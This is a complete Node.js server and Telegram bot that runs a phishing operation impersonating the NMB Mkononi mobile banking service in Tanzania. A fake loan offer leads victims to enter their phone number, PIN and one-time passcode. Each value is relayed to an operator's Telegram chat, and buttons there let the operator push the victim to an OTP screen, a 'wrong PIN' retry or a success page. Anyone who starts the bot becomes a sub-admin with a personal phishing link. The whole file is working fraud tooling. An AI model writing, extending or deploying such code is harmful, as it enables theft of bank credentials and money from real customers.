/**
 * **NMB MKONONI TANZANIA - PAGINATED PERMANENT MULTI-ADMIN SERVER**
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');

const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

// File path for permanent storage
const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      return new Map(JSON.parse(data));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();
const adminConfigMessageIds = new Map();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.status === 'DORMANT') {
      return FALLBACK_ADMIN_ID;
    }
    return targetAdmin;
  }
  return FALLBACK_ADMIN_ID || null;
}

async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
  const PAGE_SIZE = 10;
  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;

  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  let adminListText = `👑 *Sub-Admin & User Link Control Panel* (Page ${page + 1} of ${totalPages})\n\nSelect a user to toggle their active/dormant status:`;
  let keyboard = [];

  if (adminEntries.length === 0) {
    adminListText += `\n\nNo users have started the bot yet.`;
  } else {
    paginatedEntries.forEach(([id, record]) => {
      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
      const actionLabel = record.status === 'ACTIVE' ? `🔴 Deactivate ${nameDisplay}` : `🟢 Activate ${nameDisplay}`;
      const actionData = record.status === 'ACTIVE' ? `MAKE_DORMANT_${id}_${page}` : `MAKE_ACTIVE_${id}_${page}`;
      
      keyboard.push([{ text: actionLabel, callback_data: actionData }]);
    });
  }

  let navRow = [];
  if (page > 0) {
    navRow.push({ text: `⬅️ Prev`, callback_data: `PAGE_${page - 1}` });
  }
  navRow.push({ text: `🔄 Refresh`, callback_data: `PAGE_${page}` });
  if (page < totalPages - 1) {
    navRow.push({ text: `Next ➡️`, callback_data: `PAGE_${page + 1}` });
  }
  if (navRow.length > 0) {
    keyboard.push(navRow);
  }

  if (messageId) {
    try {
      await bot.editMessageText(adminListText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      return;
    } catch (err) {}
  }

  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: keyboard } 
  });
  adminConfigMessageIds.set(chatId, sentMsg.message_id);
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  try {
    console.log(`[Bot] Setting webhook URL to: ${webhookUrl}`);
    await bot.setWebHook(webhookUrl);

    app.post(webhookPath, (req, res) => {
      res.sendStatus(200);
      try {
        bot.processUpdate(req.body);
      } catch (err) {
        console.error('[Bot] Error processing webhook update:', err);
      }
    });
  } catch (err) {
    console.error('[Bot] Failed to set webhook:', err?.message || err);
    process.exit(1);
  }

  bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));

  bot.onText(/\/admins/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (chatId !== String(FALLBACK_ADMIN_ID)) {
      await bot.sendMessage(chatId, `⚠️ Unauthorized: Only the main administrator can manage sub-admin links.`);
      return;
    }
    await updateContinuousAdminList(chatId, null, 0);
  });

  bot.onText(/\/myprofile|\/me/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username ? `@${msg.from.username}` : 'None';
      const firstName = msg.from.first_name || 'N/A';
      const lastName = msg.from.last_name || 'N/A';
      
      const record = admins.get(chatId) || { status: 'ACTIVE' };
      const userLink = `${APP_URL}/?admin=${chatId}`;

      let profileText = 
        `👤 *Your Personal Details & Account Info*\n\n` +
        `• *First Name:* ${firstName}\n` +
        `• *Last Name:* ${lastName}\n` +
        `• *Username:* ${username}\n` +
        `• *Telegram ID:* \`${userId}\`\n` +
        `• *Routing Status:* *${record.status}*\n\n` +
        `🔗 *Your Exclusive Link:*\n${userLink}`;

      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('[Bot] Error handling /myprofile command:', err);
    }
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username || '';
      const firstName = msg.from.first_name || 'User';
      const lastName = msg.from.last_name || '';

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          status: 'ACTIVE',
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      } else {
        const existing = admins.get(chatId);
        existing.username = username;
        existing.firstName = firstName;
        existing.lastName = lastName;
        saveAdmins();
      }

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        const link = `${APP_URL}/?admin=${chatId}`;
        let responseText = 
          `✅ *Direct Access Link Generated*\n\n` +
          `👤 *Your Details:* ${firstName} (${username ? '@' + username : chatId})\n\n` +
          `Your Exclusive Link:\n${link}`;

        await bot.sendMessage(chatId, responseText, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '📋 View & Manage Sub-Admins', callback_data: 'PAGE_0' }],
              [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
            ]
          }
        });
        return;
      }

      const displayName = username ? `@${username}` : firstName;
      await bot.sendMessage(FALLBACK_ADMIN_ID, 
        `🚨 *New Bot Activity Detected!*\n\n` +
        `👤 *User:* ${displayName} (${firstName} ${lastName})\n` +
        `🆔 *Chat ID:* \`${userId}\`\n` +
        `🟢 *Status:* Automatically added to sub-admin routing list.`, 
        { parse_mode: 'Markdown' }
      );

      const link = `${APP_URL}/?admin=${chatId}`;
      let responseText = 
        `✅ *Welcome ${firstName}! NMB Mkononi Direct Link Generated*\n\n` +
        `Type /myprofile anytime to view your personal registration details along with your custom link.\n\n` +
        `Your Exclusive Link:\n${link}`;

      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

    } catch (err) {
      console.error('[Bot] Error handling /start command:', err);
    }
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const user = query.from;

      if (actionData === 'SHOW_MY_PROFILE') {
        const record = admins.get(chatId) || { status: 'ACTIVE' };
        const userLink = `${APP_URL}/?admin=${chatId}`;
        const profileText = 
          `👤 *Your Personal Details & Account Info*\n\n` +
          `• *First Name:* ${user.first_name || 'N/A'}\n` +
          `• *Last Name:* ${user.last_name || 'N/A'}\n` +
          `• *Username:* ${user.username ? '@' + user.username : 'None'}\n` +
          `• *Telegram ID:* \`${user.id}\`\n` +
          `• *Routing Status:* *${record.status}*\n\n` +
          `🔗 *Your Exclusive Link:*\n${userLink}`;

        await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(query.id);
        return;
      }

      if (actionData.startsWith('PAGE_')) {
        const pageNum = parseInt(actionData.split('_')[1]) || 0;
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      if (actionData.startsWith('MAKE_DORMANT_') || actionData.startsWith('MAKE_ACTIVE_')) {
        const parts = actionData.split('_');
        const actionType = parts[1];
        const targetAdminId = parts[2];
        const pageNum = parseInt(parts[3]) || 0;

        const newStatus = actionType === 'DORMANT' ? 'DORMANT' : 'ACTIVE';
        if (admins.has(targetAdminId)) {
          admins.get(targetAdminId).status = newStatus;
          saveAdmins();
        } else {
          admins.set(targetAdminId, { status: newStatus, username: '', firstName: 'User' });
          saveAdmins();
        }

        await bot.answerCallbackQuery(query.id, { text: `User ${targetAdminId} is now ${newStatus}` });
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) {
        session = { contact: 'Unknown', adminChatId: chatId };
      }

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ OTP Screen loaded for ${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Access Denied for ${session.contact}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for ${session.contact}`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error.`);
          break;
        case 'WRONG_OTP':
          session.status = 'RETRY_OTP';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` }).catch(() => {});

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(() => {});
      }
    } catch (err) {
      try {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Error processing action.' }).catch(() => {});
      } catch (e) {}
    }
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contact, pin, amount, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanContact = String(contact || '').replace(/\D/g, '');
    if (!/^0\d{9}$/.test(cleanContact)) {
      return res.status(400).json({ success: false, error: 'Namba ya NMB Mkononi lazima iwe na tarakimu 10 na kuanza na 0.' });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Destination chat ID missing.' });
    }

    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;

    sessions.set(userId, {
      contact: cleanContact,
      pin,
      amount: amount || 'TZS 2,500,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    const message =
      `🚨 *NMB MKONONI Mkopo / PIN ATTEMPT*\n\n` +
      `📱 *NMB Number:* ${cleanContact}\n` +
      `🔑 *PIN Entered:* \`${pin}\`\n` +
      `💰 *Selected Amount:* ${amount}\n\n` +
      `📌 *Status:* Waiting for Admin Approval`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ RUHUSU OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: '❌ KATAA', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    if (!bot) {
      return res.status(500).json({ success: false, error: 'Bot instance not initialized' });
    }

    const sentMsg = await bot.sendMessage(targetChat, message, opts);
    const session = sessions.get(userId);
    if (session) session.adminMsgId = sentMsg.message_id;
    
    return res.status(200).json({ success: true, userId });

  } catch (err) {
    console.error('[Server] Failed to deliver message to Telegram bot:', err?.message || err);
    return res.status(500).json({ success: false, error: 'Telegram delivery failed: ' + (err?.message || 'Unknown error') });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message =
      `📩 *4-DIGIT OTP SUBMITTED BY USER*\n\n` +
      `📱 *NMB Mkononi:* ${session.contact}\n` +
      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
      `Chagua jibu la uthibitisho:`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ PIN MBAYA', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ OTP MBAYA', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ OTP SAHIHI', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId;
    if (targetChat && bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('[Server] Failed to deliver OTP message to Telegram bot:', error?.message || error);
    return res.status(500).json({ success: false, error: 'Telegram delivery failed' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  console.log(`[Server] Running smoothly on port ${PORT}`);
  await initBot();
});
    
